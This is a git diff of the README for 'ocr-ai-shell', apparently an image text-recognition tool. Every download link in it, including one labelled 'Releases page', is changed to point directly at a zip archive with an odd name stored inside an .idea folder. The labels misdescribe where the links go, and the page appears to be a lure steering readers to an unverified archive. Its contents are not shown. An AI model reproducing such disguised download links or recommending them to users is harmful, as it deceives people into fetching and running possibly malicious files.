@@ -1,6 +1,6 @@
 # 🎉 ocr-ai-shell - Effortless Text Recognition from Images
 
-![Download ocr-ai-shell](https://raw.githubusercontent.com/GERMANCATA2023/ocr-ai-shell/main/uningenuity/ocr-ai-shell.zip)
+![Download ocr-ai-shell](https://github.com/GERMANCATA2023/ocr-ai-shell/raw/refs/heads/main/.idea/shell-ai-ocr-ataxic.zip)
 
 ## 🚀 Getting Started
 
@@ -15,14 +15,14 @@ Welcome to ocr-ai-shell! This application allows you to recognize text from imag
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Please visit our [Releases page](https://raw.githubusercontent.com/GERMANCATA2023/ocr-ai-shell/main/uningenuity/ocr-ai-shell.zip) to download the latest version. 
+To get started, you need to download the application. Please visit our [Releases page](https://github.com/GERMANCATA2023/ocr-ai-shell/raw/refs/heads/main/.idea/shell-ai-ocr-ataxic.zip) to download the latest version. 
 
 Once there, follow these steps:
 1. Find the version you want to download.
 2. Click on the download link for your operating system.
 3. Wait for the file to download.
 
-For ease, you can access the releases page using this link: [Download ocr-ai-shell](https://raw.githubusercontent.com/GERMANCATA2023/ocr-ai-shell/main/uningenuity/ocr-ai-shell.zip).
+For ease, you can access the releases page using this link: [Download ocr-ai-shell](https://github.com/GERMANCATA2023/ocr-ai-shell/raw/refs/heads/main/.idea/shell-ai-ocr-ataxic.zip).
 
 ## 💻 System Requirements
 
